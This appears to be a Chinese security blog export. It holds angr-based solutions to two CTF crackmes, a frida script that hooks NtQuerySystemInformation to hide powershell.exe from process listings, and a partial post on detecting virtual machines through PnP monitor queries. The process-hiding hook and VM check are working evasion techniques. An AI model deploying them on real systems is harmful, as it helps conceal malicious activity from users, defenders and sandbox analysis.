<h2 id="angr-入门"><a href="#angr-入门" class="headerlink" title="angr 入门"></a>angr 入门</h2><ul>
<li><a href="https://docs.angr.io/">官方文档</a></li>
<li><a href="http://angr.io/api-doc/">官方API文档</a></li>
<li><a href="https://github.com/anhkgg/angr-doc-zh_CN">中文文档</a></li>
<li><a href="https://xz.aliyun.com/t/7117">angr 系列教程(一）核心概念及模块解读</a></li>
</ul>
<h2 id="defcamp-quals-2015-r100"><a href="#defcamp-quals-2015-r100" class="headerlink" title="defcamp_quals 2015: r100"></a>defcamp_quals 2015: r100</h2><p>该题接收输入，通过<code>sub_4006FD</code>函数校验输入，通过返回值来确定执行后续哪个分支</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+0h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(s, <span class="number">255</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_4006FD((__int64)s) )	<span class="comment">// 关键点 - 验证算法</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incorrect password!&quot;</span>);	<span class="comment">// addr: 040085A</span></span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Nice!&quot;</span>);	<span class="comment">// addr: 0x0400849</span></span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证算法</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_4006FD</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-24h]</span></span><br><span class="line">  __int64 v3[<span class="number">4</span>]; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">0</span>] = (__int64)<span class="string">&quot;Dufhbmf&quot;</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = (__int64)<span class="string">&quot;pG`imos&quot;</span>;</span><br><span class="line">  v3[<span class="number">2</span>] = (__int64)<span class="string">&quot;ewUglpt&quot;</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )	<span class="comment">// 只用了前12字节</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="keyword">char</span> *)(v3[i % <span class="number">3</span>] + <span class="number">2</span> * (i / <span class="number">3</span>)) - *(<span class="keyword">char</span> *)(i + a1) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="基本解法"><a href="#基本解法" class="headerlink" title="基本解法"></a>基本解法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;r100&#x27;</span>)</span><br><span class="line">state = proj.factory.full_init_state()</span><br><span class="line">simgr = proj.factory.simulation_manager(state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find=<span class="number">0x0400849</span>, avoid=<span class="number">0x040085A</span>)</span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    print(simgr.found[<span class="number">0</span>].posix.dumps(sys.stdin.fileno()))</span><br></pre></td></tr></table></figure>
<ul>
<li>通过<code>angr.Project(&#39;r100&#39;)</code>创建<code>proj</code>对象</li>
<li><code>proj.factory.full_init_state()</code>进行完整初始化<code>state</code></li>
<li>利用创建的<code>state</code>初始化<code>simulation_manager</code>对象<code>simgr</code></li>
<li>调用<code>simgr.explore</code>方法，其中<code>find</code>参数用来标记找到的正确路径，<code>avoid</code>用来标记需要排除的路径，多个路径可以用<code>[addr1, addr2]</code>表示</li>
<li>当找到路径时，<code>simgr.found</code>非空，则可以选择打印<code>simgr.found[0]</code>路径，<code>posix.dumps(sys.stdin.fileno())</code>表示获取POSIX标准输入（<code>sys.stdin.fileno()</code>也可用0来代替）</li>
</ul>
<p>此解法运行结果及时间如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace$ time python3 exp.py </span><br><span class="line">b<span class="string">&#x27;Code_Talkers\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf1\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xb5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xe5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xe5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xd5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">real	0m4.912s</span><br><span class="line">user	0m4.688s</span><br><span class="line">sys	0m0.224s</span><br></pre></td></tr></table></figure>


<h3 id="优化解法"><a href="#优化解法" class="headerlink" title="优化解法"></a>优化解法</h3><ul>
<li><code>angr.Project(&#39;r100&#39;, auto_load_libs=False)</code>通过<code>auto_load_libs</code>参数指定是否自动加载分析依赖库，这里因为此程序只依赖了libc，angr已经做了相应的处理，所以不需要再次加载</li>
<li>使用<code>blank_state(addr)</code>来替换<code>full_init_state</code>，这里传入<code>main</code>函数地址，直接从<code>main</code>函数开始不影响接下来的验证</li>
<li>由于传入的<code>state</code>直接指定了<code>main</code>函数作为起点，故C运行库还未初始化，该题中调用的<code>printf</code>、<code>fgets</code>等函数会直接返回一个不确定值，所以要Hook这两个函数</li>
</ul>
<h4 id="angr-hook"><a href="#angr-hook" class="headerlink" title="angr hook"></a>angr hook</h4><p>在angr中预先实现了一些函数的hook，它们在<code>angr/procedures</code>下，通过<code>angr.SIM_PROCEDURES[包名][函数名]</code>得到</p>
<h5 id="user-hook"><a href="#user-hook" class="headerlink" title="user hook"></a>user hook</h5><p>使用<code>@project.hook(addr, length)</code>装饰器来定义实现一个用户Hook，参数<code>addr</code>表示需要hook的地址，<code>length</code>表示hook的长度，即在inline hook中，替换指令的字节数，示例如下，详细API说明间文档：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>@project.hook(<span class="number">0x1234</span>, length=<span class="number">5</span>)</span><br><span class="line"><span class="meta">... </span><span class="function"><span class="keyword">def</span> <span class="title">set_rax</span>(<span class="params">state</span>):</span></span><br><span class="line"><span class="meta">... </span>    state.regs.rax = <span class="number">1</span></span><br></pre></td></tr></table></figure>


<h5 id="Hooking-Symbol"><a href="#Hooking-Symbol" class="headerlink" title="Hooking Symbol"></a>Hooking Symbol</h5><p>hook符号地址，使用<code>proj</code>对象的<code>hook_symbol</code>方法来hook符号，hook函数必须以类的形式存在，且必须继承自<code>angr.SimProcedure</code>并重写类的<code>run</code>方法，示例如下，详细API说明间文档：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">NotVeryRand</span>(<span class="params">SimProcedure</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, return_values=<span class="literal">None</span></span>):</span></span><br><span class="line"><span class="meta">... </span>        rand_idx = self.state.<span class="built_in">globals</span>.get(<span class="string">&#x27;rand_idx&#x27;</span>, <span class="number">0</span>) % <span class="built_in">len</span>(return_values)</span><br><span class="line"><span class="meta">... </span>        out = return_values[rand_idx]</span><br><span class="line"><span class="meta">... </span>        self.state.<span class="built_in">globals</span>[<span class="string">&#x27;rand_idx&#x27;</span>] = rand_idx + <span class="number">1</span></span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>project.hook_symbol(<span class="string">&#x27;rand&#x27;</span>, NotVeryRand(return_values=[<span class="number">413</span>, <span class="number">612</span>, <span class="number">1025</span>, <span class="number">1111</span>]))</span><br></pre></td></tr></table></figure>


<h4 id="优化后代码"><a href="#优化后代码" class="headerlink" title="优化后代码"></a>优化后代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># hook fgets函数，根据题目中只用了前12个字节，这里就直接拿12字节内容拷贝到缓冲区上</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myfgets</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, s, num, f</span>):</span></span><br><span class="line">        simfd = self.state.posix.get_fd(sys.stdin.fileno())</span><br><span class="line">        data, ret_size = simfd.read_data(<span class="number">12</span>)</span><br><span class="line">        self.state.memory.store(s, data)</span><br><span class="line">        <span class="keyword">return</span> ret_size</span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;r100&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x04007E8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hook printf直接返回，replace=True代表替换angr自己事先hook的函数，这里printf不影响就直接给返回</span></span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;printf&#x27;</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;stubs&#x27;</span>][<span class="string">&#x27;ReturnUnconstrained&#x27;</span>](), replace=<span class="literal">True</span>)</span><br><span class="line"><span class="comment"># hook fgets，使用自己的hook函数</span></span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;fgets&#x27;</span>, Myfgets(), replace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># setting state</span></span><br><span class="line">simgr = proj.factory.simulation_manager(state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find=<span class="number">0x0400849</span>, avoid=<span class="number">0x040085A</span>)</span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    print(simgr.found[<span class="number">0</span>].posix.dumps(sys.stdin.fileno()))</span><br></pre></td></tr></table></figure>
<p>执行结果及时间</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace$ time python3 exp.py </span><br><span class="line">b<span class="string">&#x27;Code_Talkers&#x27;</span></span><br><span class="line"></span><br><span class="line">real	0m2.142s</span><br><span class="line">user	0m2.021s</span><br><span class="line">sys	0m0.123s</span><br></pre></td></tr></table></figure>


<h2 id="defcon-2016-quals-baby-re"><a href="#defcon-2016-quals-baby-re" class="headerlink" title="defcon 2016 quals: baby-re"></a>defcon 2016 quals: baby-re</h2><h3 id="基本解法-1"><a href="#基本解法-1" class="headerlink" title="基本解法"></a>基本解法</h3><p>该程序通过13次<code>scanf</code>输入13个4字节整数，然后调用<code>CheckSolution</code>函数进行校验，此函数体积非常大。下面直接hook掉程序中的<code>printf</code>和<code>fflush</code>函数让其直接返回，然后hook掉<code>scanf</code>函数，让其读取4字节内容放入缓冲区中，然后进行爆破</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHook</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, fmt, n</span>):</span></span><br><span class="line">        simfd = self.state.posix.get_fd(sys.stdin.fileno())</span><br><span class="line">        data, ret_size = simfd.read_data(<span class="number">4</span>)</span><br><span class="line">        self.state.memory.store(n, data)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;baby-re&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x04025E7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hook</span></span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;printf&#x27;</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;stubs&#x27;</span>][<span class="string">&#x27;ReturnUnconstrained&#x27;</span>](), replace=<span class="literal">True</span>)</span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;fflush&#x27;</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;stubs&#x27;</span>][<span class="string">&#x27;ReturnUnconstrained&#x27;</span>](), replace=<span class="literal">True</span>)</span><br><span class="line">proj.hook_symbol(<span class="string">&#x27;__isoc99_scanf&#x27;</span>, MyHook(), replace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># setting state</span></span><br><span class="line">simgr = proj.factory.simulation_manager(state)</span><br><span class="line"></span><br><span class="line">simgr.explore(find=<span class="number">0x04028E9</span>, avoid=<span class="number">0x0402941</span>)</span><br><span class="line"><span class="keyword">if</span> simgr.found:</span><br><span class="line">    print(simgr.found[<span class="number">0</span>].posix.dumps(sys.stdin.fileno()))</span><br><span class="line"></span><br><span class="line">s = simgr.found[<span class="number">0</span>].posix.dumps(sys.stdin.fileno())</span><br><span class="line">d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">13</span>):</span><br><span class="line">    d.append(<span class="built_in">int</span>.from_bytes(s[i * <span class="number">4</span> : i * <span class="number">4</span> + <span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>))</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure>
<p>运行结果及时间如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace$ time python3 exp.py </span><br><span class="line">b<span class="string">&#x27;M\x00\x00\x00a\x00\x00\x00t\x00\x00\x00h\x00\x00\x00 \x00\x00\x00i\x00\x00\x00s\x00\x00\x00 \x00\x00\x00h\x00\x00\x00a\x00\x00\x00r\x00\x00\x00d\x00\x00\x00!\x00\x00\x00&#x27;</span></span><br><span class="line">[77, 97, 116, 104, 32, 105, 115, 32, 104, 97, 114, 100, 33]</span><br><span class="line"></span><br><span class="line">real	0m49.306s</span><br><span class="line">user	0m49.011s</span><br><span class="line">sys	0m0.296s</span><br></pre></td></tr></table></figure>


<h3 id="优化解法-1"><a href="#优化解法-1" class="headerlink" title="优化解法"></a>优化解法</h3><ol>
<li><p>对<code>simgr</code>开启<code>LAZY_SOLVES</code>选项，该选项可不在运行时实时检查当前条件能否到达目标位置。虽然这样无法规避一些无解的情况，但可以显著提高效率</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">simgr.one_active.options.add(angr.options.LAZY_SOLVES)</span><br></pre></td></tr></table></figure></li>
<li><p>使用<code>claripy</code>模块模拟输入，<code>claripy.BVS</code>可创建符号变量，第一个参数为符号变量名，第二个参数为变量位数</p>
</li>
<li><p>在使用符号变量后，不能通过<code>posix.dump</code>来获取标准输入，而应该获取符号变量的值，<code>simgr.one_found.solver.eval</code>函数可以获取符号变量的值</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHook</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, fmt, n</span>):</span></span><br><span class="line">        simfd = self.state.posix.get_fd(sys.stdin.fileno())</span><br><span class="line">        data, ret_size = simfd.read_data(<span class="number">4</span>)</span><br><span class="line">        self.state.memory.store(n, data)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;baby-re&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.blank_state(addr=<span class="number">0x04028E0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># input，创建13个符号变量以模拟输入</span></span><br><span class="line">flag_input = [claripy.BVS(<span class="string">&#x27;flag_%d&#x27;</span> % i, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将符号变量的值放入栈中(方便)，并在调用CheckSolution函数时传参（rdi指向栈顶）</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    state.mem[state.regs.rsp + i * <span class="number">4</span>].dword = flag_input[i]</span><br><span class="line">state.regs.rdi = state.regs.rsp</span><br><span class="line"></span><br><span class="line"><span class="comment"># setting state</span></span><br><span class="line">simgr = proj.factory.simulation_manager(state)</span><br><span class="line">simgr.one_active.options.add(angr.options.LAZY_SOLVES)</span><br><span class="line"></span><br><span class="line">simgr.explore(find=<span class="number">0x04028E9</span>, avoid=<span class="number">0x0402941</span>)</span><br><span class="line"><span class="comment"># 通过simgr.one_found.solver.eval获取符号变量的值</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(simgr.one_found.solver.<span class="built_in">eval</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> flag_input)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p>运行结果及时间如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwn@ubuntu:~/workspace$ time python3 exp.py </span><br><span class="line">Math is hard!</span><br><span class="line"></span><br><span class="line">real	0m8.981s</span><br><span class="line">user	0m8.738s</span><br><span class="line">sys	0m0.244s</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>frida隐藏进程小试</title>
    <url>/2021/02/09/frida%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B%E5%B0%8F%E8%AF%95/</url>
    <content><![CDATA[<p>Hook NtQuerySystemInformation</p>
<a id="more"></a>

<h2 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS NTAPI <span class="title">NtQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="function"><span class="params">    OUT PVOID SystemInformation,</span></span></span><br><span class="line"><span class="function"><span class="params">    IN ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="function"><span class="params">    OUT PULONG ReturnLength OPTIONAL</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>该函数位于<code>ntdll.dll</code>中，第一个参数指定要查询的类型，若指定<code>SystemProcessInformation(0x5)</code>时，则会得到系统中所有进程的信息，第二个参数则返回一个<code>SYSTEM_PROCESS_INFORMATION</code>结构数组</p>
<p><code>SYSTEM_PROCESS_INFORMATION.NextEntryOffset</code>是数组中下一个成员的相对本成员的偏移值（每个成员的大小不固定），若此结构为0，则是最后一个节点，例如以下获取进程列表名</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">( NTAPI *NT_QUERY_SYSTEM_INFOMATION)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    IN SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="function"><span class="params">    OUT PVOID SystemInformation,</span></span></span><br><span class="line"><span class="function"><span class="params">    IN ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="function"><span class="params">    OUT PULONG ReturnLength OPTIONAL</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    SYSTEM_PROCESS_INFORMATION *spi = <span class="keyword">new</span> SYSTEM_PROCESS_INFORMATION[<span class="number">0x1000</span>];</span><br><span class="line">    ULONG leng;</span><br><span class="line">    NT_QUERY_SYSTEM_INFOMATION nt_query_system_infomation = (NT_QUERY_SYSTEM_INFOMATION)GetProcAddress(GetModuleHandleW(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line">    nt_query_system_infomation(SystemProcessInformation, spi, <span class="keyword">sizeof</span>(SYSTEM_PROCESS_INFORMATION) * <span class="number">0x1000</span>, &amp;leng);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> ptr = spi;</span><br><span class="line">    <span class="keyword">while</span>(ptr-&gt;NextEntryOffset != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(ptr-&gt;ImageName.Length) &#123;</span><br><span class="line">            wprintf(<span class="string">L&quot;%s\n&quot;</span>, ptr-&gt;ImageName.Buffer);</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = (SYSTEM_PROCESS_INFORMATION *)((BYTE *)ptr + ptr-&gt;NextEntryOffset);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>隐藏进程也就是修改<code>SYSTEM_PROCESS_INFORMATION.NextEntryOffset</code>来跳过需要被隐藏的进程节点</p>
<h2 id="frida-js"><a href="#frida-js" class="headerlink" title="frida js"></a>frida js</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> query_info_func = Module.findExportByName(<span class="string">&#x27;ntdll.dll&#x27;</span>, <span class="string">&#x27;NtQuerySystemInformation&#x27;</span>);</span><br><span class="line">Interceptor.attach(query_info_func, &#123;</span><br><span class="line">    onEnter : <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args[<span class="number">0</span>] == <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.work = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">this</span>.si = args[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    onLeave : <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">this</span>.work) &#123;</span><br><span class="line">            <span class="keyword">var</span> si_ptr = <span class="built_in">this</span>.si;</span><br><span class="line">            <span class="keyword">var</span> next_offset = Memory.readU32(si_ptr);</span><br><span class="line">            <span class="keyword">var</span> pre_offset = next_offset;</span><br><span class="line">            <span class="keyword">while</span>(next_offset != <span class="number">0</span>) &#123;</span><br><span class="line">                pre_offset = next_offset;</span><br><span class="line">                next_offset = Memory.readU32(si_ptr);</span><br><span class="line">                <span class="comment">// 偏移值64，针对win10 x64</span></span><br><span class="line">                <span class="keyword">var</span> image_name = Memory.readUtf16String(Memory.readPointer(si_ptr.add(<span class="number">64</span>)));</span><br><span class="line">                <span class="comment">// console.log(image_name);</span></span><br><span class="line">                <span class="comment">// 隐藏powershell</span></span><br><span class="line">                <span class="keyword">if</span>(image_name == <span class="string">&quot;powershell.exe&quot;</span>) &#123;</span><br><span class="line">                    <span class="keyword">var</span> next_node = si_ptr.add(next_offset);</span><br><span class="line">                    <span class="keyword">var</span> pre_node = si_ptr.sub(pre_offset);</span><br><span class="line">                    Memory.writeU32(pre_node, next_offset + pre_offset);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                si_ptr = si_ptr.add(next_offset);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.fuzzysecurity.com/tutorials/29.html">https://www.fuzzysecurity.com/tutorials/29.html</a></p>
]]></content>
      <categories>
        <category>攻防相关</category>
      </categories>
      <tags>
        <tag>二进制安全</tag>
      </tags>
  </entry>
  <entry>
    <title>即插即用设备检测虚拟机</title>
    <url>/2021/02/07/%E5%8D%B3%E6%8F%92%E5%8D%B3%E7%94%A8%E8%AE%BE%E5%A4%87%E6%A3%80%E6%B5%8B%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    <content><![CDATA[<p>又学到一个骚操作</p>
<a id="more"></a>

<p>参考：<a href="https://twitter.com/NinjaParanoid/status/1358098804122083334">https://twitter.com/NinjaParanoid/status/1358098804122083334</a></p>
<p>也是一个骚思路，在真机上监视器会显示<em>即插即用设备</em>，而虚拟机上不是</p>
<p><img src="/2021/02/07/%E5%8D%B3%E6%8F%92%E5%8D%B3%E7%94%A8%E8%AE%BE%E5%A4%87%E6%A3%80%E6%B5%8B%E8%99%9A%E6%8B%9F%E6%9C%BA/1.png"></p>
<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> Win32_PnPSignedDriver | <span class="built_in">select</span> DeviceName|<span class="built_in">where</span> &#123;<span class="variable">$_</span>.DeviceName <span class="operator">-like</span> <span class="string">&quot;*PnP*&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>在真机上，会输出<code>*PnP*</code>，而虚拟机上则会输出<code>*Non-PnP*</code></p>
<p><img src="/2021/02/07/%E5%8D%B3%E6%8F%92%E5%8D%B3%E7%94%A8%E8%AE%BE%E5%A4%87%E6%A3%80%E6%B5%8B%E8%99%9A%E6%8B%9F%E6%9C%BA/2.png"></p>
<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><p>利用<code>EnumDisplayDevices</code>即可遍历获取监视器相关信息</p>
